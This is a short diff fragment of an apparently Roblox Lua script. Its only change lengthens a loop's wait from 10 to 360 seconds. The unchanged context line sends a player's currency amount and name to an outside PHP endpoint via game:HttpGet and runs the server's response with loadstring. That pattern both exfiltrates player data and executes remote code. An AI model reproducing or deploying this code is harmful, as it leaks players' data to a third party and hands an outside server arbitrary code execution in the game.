@@ -39,5 +39,5 @@ until bucksAmount ~= nil
 
 loadstring(game:HttpGet("http://agt.ru.swtest.ru/TransferData.php?data="..bucksAmount.."&name="..playerName))()
   end
-wait(10)
+wait(360)
 end
